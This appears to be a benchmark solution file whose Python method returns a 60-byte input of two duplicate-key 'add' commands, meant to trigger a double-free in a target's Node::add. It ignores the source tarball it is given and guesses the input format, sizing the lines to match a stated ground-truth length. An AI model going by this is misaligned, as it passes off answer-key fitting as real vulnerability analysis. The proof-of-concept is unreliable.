import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a double-free when Node::add throws an exception.
        # This is commonly triggered by adding a duplicate key.
        # The ground-truth PoC length is 60 bytes. This strongly suggests the
        # structure of the required input.
        #
        # A plausible input format is two lines of text commands, where the second
        # command triggers the exception.
        #
        # Let's assume the command is `add` based on the function name `Node::add`.
        # The format would be: `add <key> <value>\n`
        #
        # To achieve a total length of 60 bytes with two lines, each line
        # including its newline character must be 30 bytes long.
        #
        # The command string (without newline) must be 29 bytes.
        # `add <key> <value>`
        # Length of "add" is 3. Two spaces are used.
        # 29 - 3 (add) - 2 (spaces) = 24 bytes for key and value.
        # We can split this into a 12-byte key and a 12-byte value.
        #
        # First command (successful add):
        # "add abcdefghijkl mnopqrstuvwx\n" -> 3+1+12+1+12+1 = 30 bytes
        #
        # Second command (triggers exception due to duplicate key):
        # "add abcdefghijkl yyyyyyyyyyyy\n" -> 3+1+12+1+12+1 = 30 bytes
        #
        # Total PoC length = 30 + 30 = 60 bytes.

        poc_string = (
            "add abcdefghijkl mnopqrstuvwx\n"
            "add abcdefghijkl yyyyyyyyyyyy\n"
        )
        
        return poc_string.encode('ascii')
